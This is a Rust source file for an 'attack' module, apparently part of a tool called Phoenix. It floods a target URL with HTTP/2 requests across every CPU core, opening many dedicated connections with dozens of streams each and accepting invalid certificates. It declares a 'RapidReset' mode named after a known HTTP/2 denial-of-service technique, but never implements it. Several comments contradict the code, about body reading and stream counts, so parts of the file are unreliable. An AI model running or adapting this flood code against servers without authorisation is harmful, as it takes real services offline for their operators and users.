//! Universal HTTP/2 Attack — Maximum Throughput
//!
//! Architecture:
//! - 1 OS thread per CPU core (true parallelism)
//! - Each thread: own tokio runtime
//! - Each thread: MANY separate reqwest Clients (one per connection slot)
//!   → forces actual TCP connections, not virtual multiplexing
//! - Each client: single async task, no body read, fire-and-forget
//! - Result: cores × connections real TCP connections, each pipelining HTTP/2

use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant};

use reqwest::Client;
use tracing::info;

use phoenix_metrics::AttackMetrics;
use crate::{Attack, AttackContext, AttackError, AttackResult};

#[derive(Debug, Clone, PartialEq)]
pub enum UniversalMode { LoadTest, RapidReset }

pub struct UniversalAttack {
    pub mode:        UniversalMode,
    pub connections: usize,  // real TCP connections per core
    pub duration:    Duration,
    pub rps:         Option<u32>,
}

impl UniversalAttack {
    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn with_connections(mut self, n: usize)  -> Self { self.connections = n; self }
    pub fn with_duration(mut self, d: Duration)  -> Self { self.duration    = d; self }
    pub fn with_rps(mut self, r: u32)            -> Self { self.rps         = Some(r); self }
}

/// Build a reqwest client that uses exactly ONE TCP connection to the target.
/// Key: pool_max_idle_per_host(1) + pool_idle_timeout short = dedicated connection.
fn make_dedicated_client(streams_per_conn: usize) -> Result<Client, reqwest::Error> {
    Client::builder()
        .http2_prior_knowledge()
        .danger_accept_invalid_certs(true)
        .http2_initial_stream_window_size(1u32 << 21)      // 2MB per stream
        .http2_initial_connection_window_size(1u32 << 24)  // 16MB per connection
        .http2_adaptive_window(true)
        .http2_max_frame_size(1u32 << 14)                  // 16KB frames
        .tcp_nodelay(true)
        .timeout(Duration::from_secs(8))
        .pool_max_idle_per_host(1)   // ONE connection in pool = dedicated TCP
        .pool_idle_timeout(Duration::from_secs(120))
        .build()
}

#[async_trait::async_trait]
impl Attack for UniversalAttack {
    fn name(&self) -> &str { "universal" }
    fn description(&self) -> &str {
        "Multi-core HTTP/2: 1 dedicated TCP connection per task, max pipeline"
    }

    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        let target       = ctx.target.clone();
        let duration     = self.duration;
        let conns        = self.connections.max(1);
        let metrics      = ctx.metrics.clone();
        let mode         = self.mode.clone();
        let n_cores      = num_cpus::get();
        // HTTP/2 concurrent streams per connection (nginx default max = 128)
        let streams      = 64usize;

        info!(
            "Phoenix: {} cores × {} conns × {} streams = {} concurrent req/s ceiling",
            n_cores, conns, streams, n_cores * conns * streams
        );
        info!("Each connection = 1 real TCP socket (no HTTP/2 coalescing)");

        let ok_total  = Arc::new(AtomicU64::new(0));
        let err_total = Arc::new(AtomicU64::new(0));
        let stop      = Arc::new(AtomicBool::new(false));
        let start     = Instant::now();

        let mut thread_handles = Vec::with_capacity(n_cores);

        for _core in 0..n_cores {
            let target    = target.clone();
            let ok_c      = ok_total.clone();
            let err_c     = err_total.clone();
            let stop_c    = stop.clone();
            let metrics_c = metrics.clone();
            let mode      = mode.clone();

            let handle = std::thread::spawn(move || {
                let rt = tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()
                    .expect("rt");

                rt.block_on(async move {
                    let mut tasks = Vec::with_capacity(conns * streams);

                    // Create `conns` dedicated clients — each = 1 real TCP connection
                    for _ in 0..conns {
                        let client = match make_dedicated_client(streams) {
                            Ok(c) => Arc::new(c),
                            Err(_) => continue,
                        };

                        // Spawn `streams` tasks per connection — all share same TCP socket
                        // HTTP/2 multiplexes them properly over that 1 connection
                        for _ in 0..streams {
                            let client  = client.clone();
                            let target  = target.clone();
                            let ok_c    = ok_c.clone();
                            let err_c   = err_c.clone();
                            let stop_c  = stop_c.clone();
                            let metrics = metrics_c.clone();
                            let mode    = mode.clone();

                            tasks.push(tokio::spawn(async move {
                                while !stop_c.load(Ordering::Relaxed) {
                                    let t0 = Instant::now();
                                    match client.get(&target).send().await {
                                        Ok(resp) => {
                                            let ok = resp.status().as_u16() < 400;
                                            // MUST consume body to cleanly release HTTP/2 stream slot.
                                            // drop(resp) without this leaves stream in zombie state,
                                            // filling all 32 slots and blocking new requests.
                                            let _ = resp.bytes().await;
                                            let lat = t0.elapsed().as_micros() as u64;
                                            metrics.record_request(lat, ok, 0).await;
                                            if ok { ok_c.fetch_add(1, Ordering::Relaxed); }
                                            else  { err_c.fetch_add(1, Ordering::Relaxed); }
                                        }
                                        Err(e) => {
                                            if !e.is_timeout() && !e.is_connect() {
                                                err_c.fetch_add(1, Ordering::Relaxed);
                                            }
                                            // Brief pause on error to avoid tight error loop
                                            tokio::time::sleep(Duration::from_millis(10)).await;
                                        }
                                    }
                                }
                            }));
                        }
                    }

                    tokio::time::sleep(duration).await;
                    stop_c.store(true, Ordering::Relaxed);
                    for t in tasks { t.abort(); }
                });
            });

            thread_handles.push(handle);
        }

        for h in thread_handles { let _ = h.join(); }

        let elapsed = start.elapsed();
        let ok    = ok_total.load(Ordering::Relaxed);
        let err   = err_total.load(Ordering::Relaxed);
        let total = ok + err;
        let rps   = total as f64 / elapsed.as_secs_f64();

        info!("Done: {} ok  {} err  {:.1}s  {:.0} rps", ok, err, elapsed.as_secs_f64(), rps);

        let snapshot = metrics.snapshot().await;
        Ok(AttackResult {
            success:        true,
            total_requests: total,
            errors:         err,
            duration:       elapsed,
            snapshot,
        })
    }
}
